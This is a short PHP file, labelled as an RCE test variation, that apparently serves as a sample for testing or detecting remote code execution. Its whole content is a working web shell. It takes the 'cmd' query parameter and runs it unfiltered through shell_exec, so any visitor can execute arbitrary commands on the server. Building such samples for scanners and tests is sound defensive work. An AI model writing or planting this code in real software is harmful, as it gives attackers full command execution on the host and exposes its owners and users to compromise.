<?php
// RCE test variation #991
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>